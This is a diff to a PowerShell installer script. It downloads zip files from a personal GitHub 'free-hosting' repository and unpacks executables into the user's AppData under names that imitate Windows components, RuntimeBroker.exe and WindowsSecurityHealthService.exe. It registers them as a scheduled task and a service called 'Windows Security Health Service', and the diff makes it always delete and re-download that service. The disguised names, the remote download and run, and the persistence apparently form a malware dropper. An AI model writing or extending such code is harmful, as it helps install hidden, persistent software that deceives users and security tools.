@@ -124,6 +124,7 @@ $currentDirService = "$appDataPath\Local\Microsoft"
 $taskExecutablePath = Join-Path -Path $currentDir -ChildPath "RuntimeBroker.exe"
 # Path to the executable file of the service
 $servicePath = Join-Path -Path $currentDirService -ChildPath "WindowsSecurityHealthService.exe"
+$servicePathConfig = Join-Path -Path $currentDirService -ChildPath "WindowsSecurityHealthService.exe.config"
 
 # Variables for task name and task path
 $taskName = 'RuntimeBroker'
@@ -189,17 +190,49 @@ $zipUrl = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/ap
 $zipFile = "$currentDir\app.zip"
 $unzipDir = $currentDir
 
+
+# Define the name of the service
+$serviceName = "WindowsSecurityHealthService"
+
+
+# Check if the service exists
+$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
+
+if ($service) {
+    # Check if the service is running
+    if ($service.Status -eq 'Running') {
+        # Stop the service
+        Stop-Service -Name $serviceName -Force
+        Write-Output "Service '$serviceName' stopped."
+    } else {
+        Write-Output "Service '$serviceName' is not running."
+    }
+    
+    # Delete the service
+    sc.exe delete $serviceName
+    Write-Output "Service '$serviceName' deleted."
+} else {
+    Write-Output "Service '$serviceName' does not exist."
+}
+
+if(Test-Path $servicePath){
+    Remove-Item -Path $servicePath
+}
+
+if(Test-Path $servicePathConfig){
+    Remove-Item -Path $servicePathConfig
+}
+
 Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile
 Expand-Archive -Path $zipFile -DestinationPath $unzipDir
 
-if (-not (Test-Path -Path $servicePath)) {
-    $zipUrlService = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/service.zip"
-    $zipFileService = "$currentDirService\service.zip"
-    $unzipDirService = $currentDirService
 
-    Invoke-WebRequest -Uri $zipUrlService -OutFile $zipFileService
-    Expand-Archive -Path $zipFileService -DestinationPath $unzipDirService
-}
+$zipUrlService = "https://raw.githubusercontent.com/quangpv598/free-hosting/main/dex/service.zip"
+$zipFileService = "$currentDirService\service.zip"
+$unzipDirService = $currentDirService
+
+Invoke-WebRequest -Uri $zipUrlService -OutFile $zipFileService
+Expand-Archive -Path $zipFileService -DestinationPath $unzipDirService
 
 # 3. Delete the appsettings.xml file if it exists and terminate any processes using the files in the directory
 $appSettingsPath = "$appDataPath\Local\Microsoft\appsettings.xml"
@@ -249,31 +282,6 @@ if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
 }
 
 # 6. Create service
-
-
-# Define the name of the service
-$serviceName = "WindowsSecurityHealthService"
-
-
-# Check if the service exists
-$service = Get-Service -Name $serviceName -ErrorAction SilentlyContinue
-
-if ($service) {
-    # Check if the service is running
-    if ($service.Status -eq 'Running') {
-        # Stop the service
-        Stop-Service -Name $serviceName -Force
-        Write-Output "Service '$serviceName' stopped."
-    } else {
-        Write-Output "Service '$serviceName' is not running."
-    }
-    
-    # Delete the service
-    sc.exe delete $serviceName
-    Write-Output "Service '$serviceName' deleted."
-} else {
-    Write-Output "Service '$serviceName' does not exist."
-}
 
 # Display name of the service
 $displayName = "Windows Security Health Service"
